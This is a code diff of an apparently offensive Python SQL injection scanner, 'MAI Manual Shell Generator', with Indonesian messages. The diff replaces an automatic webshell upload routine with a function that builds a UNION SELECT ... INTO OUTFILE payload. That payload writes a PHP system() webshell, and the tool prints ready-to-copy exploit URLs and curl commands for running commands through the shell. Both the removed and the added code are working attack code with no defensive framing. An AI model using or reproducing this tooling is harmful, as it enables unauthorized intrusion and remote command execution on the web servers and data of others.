@@ -1,10 +1,9 @@
 #!/usr/bin/env python3
 # -*- coding: utf-8 -*-
 
-# --[MAI]--
+# --[MAI]-- Manual Shell Generator
 # Author: JunedXsec
-# Inspired By: sqlmap, muani injection tools, psql-pro
-# Version: 4.2 (2026) - Stable
+# Version: 5.0 - Manual Execution Mode
 
 import sys
 import os
@@ -31,7 +30,6 @@ RETRY_COUNT = 2
 USER_AGENTS = [
     "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
     "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15",
-    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36"
 ]
 
 C = {
@@ -45,9 +43,8 @@ C = {
 }
 
 print_lock = threading.Lock()
-
-def safe_print(msg):
-    with print_lock:
+def safe_print(msg): 
+    with print_lock: 
         print(msg)
 
 def clear_screen():
@@ -58,12 +55,12 @@ def log_error(msg): safe_print(f"{C['ERROR']}[ERROR]{C['RESET']} {msg}")
 def log_success(msg): safe_print(f"{C['SUCCESS']}[SUCCESS]{C['RESET']} {msg}")
 def log_warning(msg): safe_print(f"{C['WARNING']}[WARNING]{C['RESET']} {msg}")
 def log_banner():
-    safe_print(f"{C['BOLD']}{C['CYAN']}--[MAI]--{C['RESET']}")
+    safe_print(f"{C['BOLD']}{C['CYAN']}--[MAI]-- Manual Shell Generator{C['RESET']}")
     safe_print(f"{C['BOLD']}Author: JunedXsec{C['RESET']}")
-    safe_print("Inspired By: sqlmap, muani injection tools, psql-pro")
-    safe_print("")  # baris kosong
+    safe_print("Mode: Tidak auto upload, hanya generate payload untuk dieksekusi manual")
+    safe_print()
 
-# ==================== HTTP HELPER ====================
+# ==================== HTTP ====================
 session = requests.Session()
 session.verify = False
 
@@ -211,38 +208,14 @@ def union_extract(url, param, original_value, inj_type, trigger, num_cols):
             return True
     return False
 
-def upload_dios(url, param, original_value, inj_type, trigger, num_cols):
-    log_info("Mengupload dios...")
-    shell_content = "<?php if(isset($_REQUEST['cmd'])){system($_REQUEST['cmd']);}?>"
-    paths = [
-        "/var/www/html/shell.php",
-        "/var/www/shell.php",
-        "/home/public_html/shell.php",
-        "/tmp/shell.php",
-        "C:/xampp/htdocs/shell.php",
-        "C:/inetpub/wwwroot/shell.php"
-    ]
-    for out_path in paths:
-        nulls = ['NULL'] * num_cols
-        nulls[0] = f"'{shell_content}'"
-        if inj_type == "string":
-            payload = f"{original_value}{trigger} UNION SELECT {','.join(nulls)} INTO OUTFILE '{out_path}'-- -"
-        else:
-            payload = f"{original_value}{trigger} UNION SELECT {','.join(nulls)} INTO OUTFILE '{out_path}'-- -"
-        params = {param: payload}
-        resp = fetch(url, params=params)
-        log_info("Mengecek Output respon")
-        if resp and "error" not in resp.text.lower():
-            log_info("Output Berhasil Di Periksa")
-            parsed = urllib.parse.urlparse(url)
-            base_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
-            dios_url = f"{base_url}?{param}={urllib.parse.quote(payload)}"
-            log_success(f"Dios: {dios_url}")
-            log_success(f"Webshell uploaded to {out_path}")
-            log_warning(f"Akses: {out_path}?cmd=id")
-            return True
-    log_error("Gagal mengupload dios (periksa hak FILE MySQL)")
-    return False
+def generate_shell_payload(base_url, param, original_value, trigger, num_cols, shell_path):
+    shell_code = "<?php if(isset($_REQUEST['cmd'])){system($_REQUEST['cmd']);}?>"
+    nulls = ['NULL'] * num_cols
+    nulls[0] = f"'{shell_code}'"
+    # Untuk string based (sudah terdeteksi)
+    payload = f"{original_value}{trigger} UNION SELECT {','.join(nulls)} INTO OUTFILE '{shell_path}'-- -"
+    full_url = f"{base_url}?{param}={urllib.parse.quote(payload)}"
+    return full_url, payload
 
 def scan_endpoint(url, params_dict):
     for param, orig_val in params_dict.items():
@@ -261,7 +234,29 @@ def scan_endpoint(url, params_dict):
             continue
         log_info(f"Jumlah Column: {num_cols}")
         if union_extract(url, param, orig_val, inj_type, trigger, num_cols):
-            upload_dios(url, param, orig_val, inj_type, trigger, num_cols)
+            log_success(f"Parameter {param} rentan! Sekarang generate shell.")
+            while True:
+                print(f"\n{C['WARNING']}[?] Buat shell? (y/n): {C['RESET']}", end='')
+                ans = sys.stdin.readline().strip().lower()
+                if ans == 'y':
+                    parsed = urllib.parse.urlparse(url)
+                    base_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
+                    default_path = "/var/www/html/shell.php"
+                    print(f"{C['CYAN']}Masukkan path shell (default: {default_path}): {C['RESET']}", end='')
+                    shell_path = sys.stdin.readline().strip()
+                    if not shell_path:
+                        shell_path = default_path
+                    full_url, raw_payload = generate_shell_payload(base_url, param, orig_val, trigger, num_cols, shell_path)
+                    print(f"\n{C['SUCCESS']}========= SHELL PAYLOAD (COPY INI) ========={C['RESET']}")
+                    print(f"{C['BOLD']}URL LENGKAP:{C['RESET']}\n{full_url}")
+                    print(f"\n{C['BOLD']}Atau perintah curl:{C['RESET']}")
+                    print(f"curl -A 'Mozilla/5.0' '{full_url}'")
+                    print(f"\n{C['BOLD']}Untuk eksekusi command nanti:{C['RESET']}")
+                    print(f"curl -A 'Mozilla/5.0' '{shell_path}?cmd=id'")
+                    print(f"{C['SUCCESS']}============================================{C['RESET']}")
+                    break
+                elif ans == 'n':
+                    break
         break
 
 def main():
@@ -290,14 +285,6 @@ def main():
                 future.result()
             except Exception as e:
                 log_error(f"Thread error: {e}")
-    
-    for action, method, inputs in post_forms:
-        log_info(f"Mencoba POST form: {action}")
-        for field in inputs[:2]:
-            test_data = {field: "'"}
-            resp = fetch(action, post_data=test_data)
-            if resp and ("mysql" in resp.text.lower() or "error" in resp.text.lower()):
-                log_success(f"Potensi SQLi POST pada field {field} di {action}")
     
     log_success("Scan selesai.")
 
